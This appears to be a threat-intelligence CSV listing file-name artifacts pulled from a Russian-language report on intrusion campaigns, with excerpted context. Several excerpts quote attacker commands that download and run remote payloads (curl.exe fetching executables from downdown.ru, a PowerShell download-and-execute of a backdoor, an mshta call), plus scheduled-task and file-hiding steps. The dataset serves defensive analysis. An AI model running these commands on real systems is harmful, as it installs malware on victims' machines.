schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:d376b1f946495a5336e630549b1df882afec43f06facca5d3c4b2af9ecf65925,observation--sha256:4f2a1ee89d81529da49e106340063da0cea5bdbf0309c10cfe6eaac53c9a8592,file-name,conhost.exe,conhost.exe,candidate,2024-09-15T00:00:00Z,day,known,same-record,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 127}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.007 Command and Scripting Interpreter: JavaScript Атакующие используют JS-скрипты для создания задачи планировщика для запуска UltraVNC, например: ... set strain=19 set mainland[0]=var sexy = new ActiveXObject(""Schedule.Service""); set mainland[1]=sexy.Connect(); set mainland[2]=var ethNic23 = sexy.GetFolder(""\\""); set mainland[3]=var deficIency87 = sexy.NewTask(0); set mainland[4]=deficIency87.Principal.LogonType = 3; set mainland[5]=var hidDen76 = deficIency87.Triggers.Create(2); set main",
1.0.0,actor--anonymous,artifact--sha256:d376b1f946495a5336e630549b1df882afec43f06facca5d3c4b2af9ecf65925,observation--sha256:c008a85e91b22cca54085a43f7478a728eb9e9ecc528d20eee7cb0e1f7a61104,file-name,conhost.exe,conhost.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 128}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1204.002 Malicious File Атакующие используют вредоносные вложения в фишинговые письма, содержащие исполняемые файлы, которые пользователь должен запустить самостоятельно, чтобы атакующий получил доступ к машине жертвы. Такие вложения обычно являются самораспаковывающимися 7-Zip архивами или же дропперами, написанными на Golang. Дополнительно отметим следующее: в ходе масштабного поиска всех доступных нам имплантов, относящихся к этой группе, мы обнаружили импланты, которые отличались от большин",
1.0.0,actor--anonymous,artifact--sha256:d376b1f946495a5336e630549b1df882afec43f06facca5d3c4b2af9ecf65925,observation--sha256:0086c31517f89db62158a85f14afca176f3cc64eed1631748e2208bc4048c207,file-name,conhost.exe,conhost.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 131}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Резюме кандидата на должность.docx.exe copy /y ""G0B4BlB4BPBsB2BH.ini"" ""%o2dydTdxdrdYdDd7%.exe"" c:\windows\system32\appevtmgr.exe, c:\windows\NetSyncSvc.exe и другие. c:\windows\system32\config\conhost.exe $system32\config\conhost.exe"" --headless $appdata\Google\Chrome\chrome.exe -p 443 root@[C2 SERVER] T1036.007 Double File Extension Атакующие используют двойные расширения при именовании своих имплантов, чтобы скрыть настоящий тип файла. В этом случае (при определенных условиях) только первое ра",
1.0.0,actor--anonymous,artifact--sha256:d376b1f946495a5336e630549b1df882afec43f06facca5d3c4b2af9ecf65925,observation--sha256:f9b8a048df611dc877efb2cd9b0e14fa652bc0b25e9c0e411b41fbfb53874f10,file-name,conhost.exe,conhost.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 161}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1204.002 User Execution: Malicious File После того как пользователи получали вредоносный архив, следующим этапом цепочки заражения было использование содержащегося внутри архива LNK-файла, маскирующего выполнение вредоносного кода под запуск якобы легитимного документа. В одном из обнаруженных нами архивов при открытии файла Rez_ZelibRV.lnk автоматически выполнялась команда, содержащая цепочку действий через cmd.exe, WinRAR.exe и PowerShell. Листинг команды представлен ниже: Команда, прописанна",
1.0.0,actor--anonymous,artifact--sha256:5060a826a28bbc0256a7d50166415a266271eb398c7364b618cbc1163da28a3f,observation--sha256:546e2f042f3575c9b59405aeed27d13936fba43110662914afdc2f636cb64b9a,file-name,cplhost.exe,cplhost.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 94}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1036.004 Masquerade Task or Service Г руппировка маскирует наименования созданных запланированных задач под легитимные: • “MicrosoftUpdateCore”, • “MicrosoftUpdateCoree”, • “Microsoft Update”, • “WIndows Core”, • “SystemAdminAgent <ClientID>”. T1036.005 Match Legitimate Name or Location Злоумышленники маскировали сэмплы, являющиеся экземплярами шифровальщика LockBit, под легитимные утилиты OneDrive.exe и VLC.exe. Помимо шифровальщиков, другой инструментарий также маскировался под легитимные ути",
1.0.0,actor--anonymous,artifact--sha256:0bc2f235a58267756b77f85374bc1fd363fe65596e0f0acefee5e94157e7d6dd,observation--sha256:dca3d88facbca0226d98fa0596b62b96a6786ef1ba6016d0dff130289718045c,file-name,cscript.exe,cscript.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 213}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta Set WshShell = WScript.CreateObject(""WScript.Shell"") WshShell.Run Chr(34) & "".\zermndzg.bat"" & Chr(34), 0, False WshShell.Run Chr(34) & "".\zermndzg.docx"" & Chr(34), 1, False Set WshShell = Nothing var objService = GetObject(""winmgmts:\\\\.\\root\\cimv2"");var objStartup = objService.Get(""Win32_ProcessStartup"");var objConfig = objStartup. SpawnInstance_();objConfig.ShowWindow = 0;var processClass = o",
1.0.0,actor--anonymous,artifact--sha256:4068d6e6c78693b36cea0d8a681a2685dc4f1c5f0cedd84aa8904f53f311e3a4,observation--sha256:f24aa216efc6d1ff04ef2bd3e52d54a4a38dfeb371f6d6a7c24a33b3012c2de5,file-name,csrss32.exe,csrss32.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 160}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Также стоит отметить, что в коде содержится часть, отвечающая за скачивание и запуск бэкдора: — <code block> — <script> function openCalculator() { try { var shell = new ActiveXObject(""WScript.Shell""); // Одной командой скачиваем файл и запускаем shell.Run( ""powershell -Command \""Invoke-WebRequest 'hxxps://files. gkrzn[.]ru/direct/cb72fe89-1d75-4b2b-a138-8b5bf51b7578/8fc4eac9/rezume.pdf' -OutFile $Env:TEMP\\csrss32.exe; Start-Process $Env:TEMP\\csrss32.exe\"""", 0, true ); } catch (e) { alert(""Una",
1.0.0,actor--anonymous,artifact--sha256:4068d6e6c78693b36cea0d8a681a2685dc4f1c5f0cedd84aa8904f53f311e3a4,observation--sha256:c8a9f12e9b8734e048693855cf1e447944926f3e91bf8b321bd999ed76e9a4c8,file-name,csrss32.exe,csrss32.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 164}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"В рамках проведенного исследования были зафиксированы следующие названия, использовавшиеся для маскировки вредоносных компонентов: • libcairo-2.dll, • driver_printer.exe, • chrome_proxy.exe, • onedrivesync.exe, • OneDirveSvh.exe, • windowssubprocessqueue.exe, • dbinit.exe, • nvidiacontrolpanel.exe, • telegram.exe, • yandexupdate.exe, • chrome.exe, • openvpndaemon.exe, • kesservice.exe, • klservice.exe, • GoogleUpdate.exe, • dbexecutor.exe, • ms-teams.exe, • csrss32.exe, • msedgeconnect.exe, • pk",
1.0.0,actor--anonymous,artifact--sha256:4068d6e6c78693b36cea0d8a681a2685dc4f1c5f0cedd84aa8904f53f311e3a4,observation--sha256:5eebc209f3c79a9145bd382278ce484d259da6d3dde142581d4304d1a5437442,file-name,csrss32.exe,csrss32.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 166}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1016 System Network Configuration Discovery Одна из задач злоумышленников на ранних этапах после компрометации — это определение публичного IP-адреса зараженного хоста. Для этого использовалась следующая PowerShell-команда: Команда обращается к стороннему публичному сервису https://ident.me, который возвращает внешний IP-адрес устройства. Также в рамках этапа разведки в скомпрометированной системе злоумышленники запустили следующую команду: powershell.exe -C ""[Console]::OutputEncoding = New-Obj",
1.0.0,actor--anonymous,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:b2dfada80472022b33e7484f4b58874bad5eb10b9226ffef321eeb872b3226e4,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 172}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"В декабре 2024 года мы обнаружили очередную атаку Librarian Likho. Нам удалось получить один имплант из этой атаки. Мы изучили этот имплант и выяснили, что он является самораспаковывающимся архивом, созданным при помощи Smart Install Maker, что означает, что содержимое может быть легко извлечено. После распаковки архива мы получили три файла: • data.cab — CAB-файл, содержащий все значимые файлы импланта; • installer.config — конфигурационный файл инсталлятора, содержит команды, которые должны бы",
1.0.0,actor--anonymous,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:3ef84b6aa08cb0dfd1ba34a927f2afad705a01c0ec273496bf408b83d4b3a734,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 173}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,cd C:\Intel\ ping -n 6 127.0.0.1 C:\Intel\curl.exe -o C:\Intel\driver.exe hxxp://downdown[.]ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe hxxp://downdown[.]ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe hxxp://downdown[.]ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar hxxp://downdown[.]ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 hxxp://downdown[.]ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe hxxp://downdown[.]ru/dc.jpg C:\Intel\driver.exe x -r -ep2 -hplimpid,
1.0.0,actor--anonymous,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:bec99702c52871400d403476011e875620fb61106f1a1b384da53567d2b77be3,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 176}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ATTRIB +s +h @$&%17\Intel del /q %SYSTEMDRIVE%\Intel\curl.exe del /q %SYSTEMDRIVE%\Intel\Trays.rar del /q %SYSTEMDRIVE%\Intel\svchost.exe Privilege Escalation Defense Evasion T1548.002 Bypass User Account Control Импланты APT собраны при помощи Smart Install Maker, который может запрашивать пользователя предоставить права администратора для привилегированного выполнения команд. T1564.001 Hidden Files and Directories Злоумышленники устанавливают атрибуты «скрытый» и «системный» на папку C:\Intel,",
1.0.0,actor--anonymous,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:a4ab1aaf6fdc5b5752bf0290d8aa803abdabb49bfd0b0598084a4ccbf28b6a5a,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 184}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Intel\curl.exe -o C:\Intel\driver.exe http://downdown.ru/driver.jpg C:\Intel\curl.exe -o C:\Intel\blat.exe http://downdown.ru/blat.jpg C:\Intel\curl.exe -o C:\Intel\svchost.exe http://downdown.ru/svchost.jpg C:\Intel\curl.exe -o C:\Intel\Trays.rar http://downdown.ru/Trays.jpg C:\Intel\curl.exe -o C:\Intel\AnyDesk\wol.ps1 http://downdown.ru/wol.jpg C:\Intel\curl.exe -o C:\Intel\dc.exe http://downdown.ru/dc.jpg :: Копирование в Public if exist ""\\!CURRENT_IP!\Users\Public"" ( echo Copying to ""\\",
